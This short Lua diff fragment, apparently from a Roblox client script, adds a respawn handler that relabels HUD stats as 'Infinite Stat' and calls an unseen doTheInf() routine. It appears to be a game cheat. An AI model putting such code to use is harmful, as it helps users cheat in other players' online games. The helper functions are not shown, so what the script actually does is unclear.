-    Player.Character:WaitForChild("PowerOutput", 30)
-
-    task.wait(Settings.CharacterDelayTime)
+    success = true
 end
+
+plr.CharacterAdded:Connect(function()
+    local t = tick()
+    load()
+    plr.PlayerGui.HUD.Bottom.Stats.Labvel.TextLabel.Text = "Infinite Stat"
+    plr.PlayerGui.HUD.Bottom.Stats.Namae.Val.Text = getName()
+    plr.PlayerGui.HUD.Bottom.Stats.Visible = true
+    doTheInf()
+end)
+doTheInf()
